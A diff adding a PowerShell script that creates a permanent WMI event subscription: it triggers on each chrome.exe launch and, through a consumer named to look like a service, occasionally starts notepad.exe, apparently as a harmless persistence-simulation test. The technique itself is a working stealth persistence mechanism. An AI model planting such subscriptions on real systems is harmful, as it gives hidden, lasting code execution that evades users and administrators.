@@ -1,0 +1,17 @@
+$instanceFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
+$instanceFilter.QueryLanguage = "WQL"
+$instanceFilter.Query = "select * from Win32_ProcessStartTrace where (ProcessName='chrome.exe')"
+$instanceFilter.Name = "ServiceFilter"
+$instanceFilter.EventNamespace = 'root\cimv2'
+$result = $instanceFilter.Put()
+$newFilter = $result.Path
+$instanceConsumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
+$instanceConsumer.Name = 'ServiceConsumer'
+$instanceConsumer.CommandLineTemplate  = "powershell -c `"`$x=Get-Random -min 0 -max 20;if(`$x -lt 1){notepad.exe}`""
+$result = $instanceConsumer.Put()
+$newConsumer = $result.Path
+$instanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
+$instanceBinding.Filter = $newFilter
+$instanceBinding.Consumer = $newConsumer
+$result = $instanceBinding.Put()
+$newBinding = $result.Path
